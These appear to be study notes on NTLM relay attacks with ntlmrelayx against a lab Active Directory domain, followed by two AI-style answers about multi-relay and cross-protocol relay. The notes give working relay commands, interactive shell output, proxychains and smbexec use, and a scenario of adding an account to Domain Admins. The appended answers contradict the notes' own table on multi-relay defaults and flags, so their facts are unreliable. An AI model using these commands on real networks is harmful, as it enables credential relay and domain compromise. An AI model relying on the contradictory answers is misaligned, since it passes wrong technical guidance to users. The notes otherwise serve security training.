
- it specify which user we are waiting for him to auth to us, then where should we relay his auth.
- You can listen for http, smb NTLM authentication only, but you can relay them to most protocols.

## Multi-Relay
`ntlmrelayx` implements the `multi-relay` feature by making the clients authenticate on the attack machine locally, fetch/extract their identities, and then force them to reauthenticate so that it can relay their connections to the relay targets. `Multi-relaying` is the default behavior for the HTTP and SMB servers of `ntlmrelayx`; however, to deactivate it, we can use the `--no-multirelay` option, making it relay the connection(s) only once (i.e., one incoming connection maps to only one attack).

## Target Definition
Because of the `multi-relay` feature, targets can be either `named targets` or `general targets`; `named targets` are targets with their identity specified, while `general targets` are targets without identity. Defining targets follows the [URI format](https://datatracker.ietf.org/doc/html/rfc3986), with its syntax consisting of three components: `scheme://authority/path`:
- `scheme`: Defines the targeted protocol (e.g., `http` or `ldap`); if not supplied, `smb` is used as the default protocol. The wildcard keyword `all` makes `ntlmrelayx` use all the protocols it supports.
- `authority`: Specified using the format `DOMAIN_NAME\\USERNAME@HOST:PORT`. `General targets` do not use `DOMAIN_NAME\\USERNAME`; only `named targets` do.
- `path`: Optional and only required for specific attacks, such as when accessing access-restricted web endpoints using a relayed `HTTP NTLM` authentication (`Targeting ADCS` )

The HTTP and SMB servers of `ntlmrelyax` have the `multi-relaying` feature enabled by default, except when attacking a single `general target`. Depending on the `target type`, `ntlmrelayx` has the following default settings for the `multi-relay` feature:

| **Target Type**         | **Example**                                   | **Multi-relaying Default Status** |
| :---------------------- | :-------------------------------------------- | :-------------------------------- |
| `Single General Target` | `-t 172.16.117.50`                            | `Disabled`                        |
| `Single Named Target`   | `-t smb://INLANEFREIGHT\\PETER@172.16.117.50` | `Enabled`                         |
| `Multiple Targets`      | `-tf relayTargets.txt`                        | `Enabled`                         |
Suppose we instruct `ntlmrelayx` to use the target "`smb://172.16.117.50`"; in this case, since it is a `general target`, `multi-relay` will be `disabled`, and `ntlmrelayx` will relay only the first `NTLM` authentication connection belonging to any user (from any host) to the relay target 172.16.117.50 over SMB. This relationship is `1:1`, as `one` connection maps to only `one` attack (an edge case is whereby `ntlmrelayx` receives two different connections at the same time; although `multi-relay` will be disabled, `ntlmrelayx` incorrectly relays the two connections instead of rejecting either of them):
```sh
ntlmrelayx.py -t smb://172.16.117.50
```
Alternatively, suppose we instruct `ntlmrelayx` to use the target "`smb://INLANEFREIGHT\\PETER@172.16.117.50`"; in this case, since it is a single `named target`, `multi-relay` will be `enabled`, and `ntlmrelayx` will relay any number of `NTLM` authentication connections belonging to `INLANEFREIGHT\PETER` (from any host) to the relay target 172.16.117.50 over SMB (we must supply the domain name and username precisely as shown in `ntlmrelayx`'s output). This relationship is `M:M`, as `many` connections map to `many` attacks:
```sh
ntlmrelayx.py -t smb://INLANEFREIGHT\\PETER@172.16.117.50
```
What if we want to use the same `general target` "`smb://172.16.117.50`" but we also want to enable `multi-relaying`? To do so, we must put the target in a file and use the `-tf` option, which enables `multi-relaying` by default. Therefore, regardless of the file containing a `general target`, because `multi-relaying` is enabled due to the `-tf` option, `ntlmrelayx` will relay any number of `NTLM` authentication connections belonging to any user (from any host) to the relay target 172.16.117.50 over SMB. Instead of having a `1:1` relationship like `general targets`, this becomes `M:M`, as `many` connections map to `many` attacks:
```sh
cat relayTarget.txt

smb://172.16.117.50
ntlmrelayx.py -tf relayTarget.txt
```

At last, suppose we want use the same `named target` "`smb://INLANEFREIGHT\\PETER@172.16.117.50`", but only want to abuse the first connection `ntlmrelayx` can relay for the user `INLANEFREIGHT\PETER`; to do so, we can disable `multi-relay` with the `--no-multirelay` option:
```sh
ntlmrelayx.py -t smb://INLANEFREIGHT\\PETER@172.16.117.50 --no-multirelay
```

---
## Interactive
When you use `-i` for every new connection it will give you the port that you can use to interact with the service.
```sh
ntlmrelayx.py -tf relayTargets.txt -smb2support -i
[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Connection from INLANEFREIGHT/RMONTY@172.16.117.3 controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/RMONTY SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] SMBD-Thread-5: Connection from INLANEFREIGHT/RMONTY@172.16.117.3 controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/RMONTY SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11001
```
Now use netcat to interact:
```sh
nc -nv 127.0.0.1 11000
```

---
## SOCKs Connections
we can use `-socks` and keep as many connections active as possible. Let's see this in action.
```sh
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

> help
> socks
```
first, we must set the `proxychains` configuration file to use `ntlmrelayx`'s default proxy port, `1080`, for SOCKS4/5. By default, the location of the `proxychains` configuration file on Linux is `/etc/proxychains.conf`:
```sh
cat /etc/proxychains4.conf | grep socks4

#       proxy types: http, socks4, socks5
socks4  127.0.0.1 1080
```

Now you can interact with the service.
```sh
proxychains4 -q smbexec.py INLANEFREIGHT/PETER@172.16.117.50 -no-pass
proxychains4 -q smbclient.py INLANEFREIGHT/RMONTY@172.16.117.50 -no-pass
```
---
## Cross-protocol Relay
| **Relay Authentication From** | **Relay Authentication Over**                                                      | **Cross-protocol?** |
| :---------------------------- | :--------------------------------------------------------------------------------- | :------------------ |
| `HTTP`(`S`)                   | `HTTP`(`S`)                                                                        | `No`                |
| `HTTP`(`S`)                   | `IMAP` \| `LDAP`(`S`) \| `MSSQL` \| `RPC` \| `SMBv/1/2/3` \| `SMTP`                | `Yes`               |
| `SMBv/1/2/3`                  | `SMBv/1/2/3`                                                                       | `No`                |
| `SMBv/1/2/3`                  | `HTTP`(`S`) \| `IMAP` \| `LDAP`(`S`) \| `MSSQL` \| `RPC` \| `SMTP`                 | `Yes`               |
| `WCF`                         | `HTTP`(`S`) \| `IMAP` \| `LDAP`(`S`) \| `MSSQL` \| `RPC` \| `SMBv/1/2/3` \| `SMTP` | `Yes`               |




---

> [!Question] 
> when i do multi-relaying does that mean it also do cross-protocol relay. so if we got smb authentication we relay it to other servers with also other services like http, ldap

The short answer is: **Yes, absolutely!** The tool is designed to combine these concepts to maximize your lateral movement.

###  The Core Concept: NTLM is Protocol-Agnostic

The key reason this works is that **NTLM (NT LAN Manager) is an encapsulated authentication protocol.**
1. When a victim authenticates, the core part of the authentication—the three messages (Negotiate, Challenge, and Authenticate)—remains the same, regardless of the application protocol it's wrapped in (SMB, HTTP, etc.).
2. `ntlmrelayx.py` strips the core NTLM messages out of the incoming protocol (e.g., SMB) and can then re-wrap them into a _different_ protocol (e.g., LDAP) for the outgoing connection.

This is the definition of **Cross-Protocol Relaying**.

### Combining the Features
The **Multi-Relaying** feature (using `--keep-relaying` or a target file) enhances this by applying the cross-protocol capability to a list of targets:

|**Feature**|**Input**|**Output**|**Action**|
|---|---|---|---|
|**Cross-Protocol**|Incoming **SMB** authentication from Victim|Relayed as **LDAP** to a DC|Attacks LDAP services (e.g., adding a user to a group).|
|**Multi-Relaying**|Single incoming authentication (SMB)|Relayed to Target 1, Target 2, Target 3...|Maximizes one opportunity across multiple hosts/services.|

#### Scenario Example

Let's say you poison an LLMNR request, and a Domain Admin workstation sends you an **SMB** authentication attempt:
1. **Victim (Domain Admin)** sends **SMB** NTLM auth to **Attacker (ntlmrelayx)**.
2. **Attacker** uses **Multi-Relaying** mode with a target file (`targets.txt`):
    - **Target 1 (10.10.10.150):** A Windows Server with SMB signing disabled.
        - The authentication is **relayed as SMB** to this target, and `ntlmrelayx` executes a pre-defined attack (like dumping the SAM database). (Same-protocol relay)
    - **Target 2 (10.10.10.10):** The Domain Controller (DC) running LDAP.
        - The authentication is immediately **relayed as LDAP** to the DC. (Cross-protocol relay)
        - `ntlmrelayx` can then leverage the LDAP session to add your low-privilege account to the Domain Admins group.

This combined capability is why `ntlmrelayx.py` is considered the most versatile tool for NTLM relay attacks—it lets you dynamically choose the best attack path (SMB, LDAP, HTTP, MSSQL) for _each_ target, all from a single intercepted connection.

---

> [!Question] 
> Target modes

### Clarifying `ntlmrelayx.py` Targeting Modes

Here is a breakdown of your examples, focusing on the default behavior and the role of the **Cross-Protocol** capability.

| **Target Type**           | **Example Command**                           | **Multi-Relaying Status** | **Cross-Protocol Status** | **Key Clarification**                                                                                                                                                                                                     |
| ------------------------- | --------------------------------------------- | ------------------------- | ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Single General Target** | `-t 172.16.117.50`                            | **Disabled** (Default)    | **Enabled** (Automatic)   | The tool will only attempt **one** relay to this single target, but it **will** automatically attempt **cross-protocol relay** (e.g., SMB to LDAP, SMB to MSSQL) to the target to see which service it can compromise.    |
| **Single Named Target**   | `-t smb://INLANEFREIGHT\\PETER@172.16.117.50` | **Disabled** (Default)    | **Enabled** (Automatic)   | Same as above. The inclusion of the username/protocol **limits the _action_ taken**, but the core NTLM relay logic still supports cross-protocol by default. It waits for **one** authentication to relay to this target. |
| **Multiple Targets**      | `-tf relayTargets.txt`                        | **Enabled** (Default)     | **Enabled** (Automatic)   | The presence of a target file **automatically enables** multi-relaying (`--keep-relaying` is implied) and performs cross-protocol attacks on _every_ target in the file.                                                  |

---

### 🎯 Key Takeaways and Corrections

1. Cross-Protocol Relaying is the Default Behavior (Unless specified otherwise).
    The ability to relay an incoming SMB authentication as an outgoing LDAP authentication (or vice-versa) is a core function of ntlmrelayx.py's relay logic. It is always enabled by default, even in the single-target mode (-t). The tool tries the most aggressive and effective attack module it can for the target service, regardless of the incoming protocol.
    - **Correction:** The first two examples **do** have cross-protocol capability.
2. **Multi-Relaying is Only Enabled by Default with Multiple Targets.**
    - **Single Target (`-t 172.16.117.50`):** The tool waits for a single incoming authentication and uses it to attack that one target. Once the relay is successful or fails, the listener stops or resets. The `--keep-relaying` flag would be required to keep the listener active and reuse a subsequent authentication.
    - **Target File (`-tf relayTargets.txt`):** The tool is designed to hit many targets, so multi-relaying is the default mode here.
3. **The Second Example (`-t smb://...`) is about Attack Customization, not Multi-Relaying.**
    - `smb://INLANEFREIGHT\\PETER@172.16.117.50` tells `ntlmrelayx.py`: "When you relay the session to this target, execute the **SMB attack module** and try to log in as the user `PETER`." This is not a multi-relaying scenario; it's a customization of the single-target attack.
### Summary of Flags

|**Flag**|**Purpose**|**Default Behavior**|
|---|---|---|
|**`-t <target>`**|Specifies a **single** target.|No Multi-Relaying, Cross-Protocol **Enabled**.|
|**`-tf <file>`**|Specifies a file of **multiple** targets.|Multi-Relaying **Enabled**, Cross-Protocol **Enabled**.|
|**`--keep-relaying`**|Forces Multi-Relaying when using the `-t` flag.|Used to override the single-target behavior.|

The key takeaway is that you don't need to specify cross-protocol relaying—it's always there. You only need to think about **multi-relaying** when you want to hit more than one target from a single intercepted authentication.

Would you like to see the **PowerShell** commands that can be used on a Windows machine to quickly identify targets on the network that are vulnerable to NTLM Relay (i.e., hosts that have SMB signing disabled)?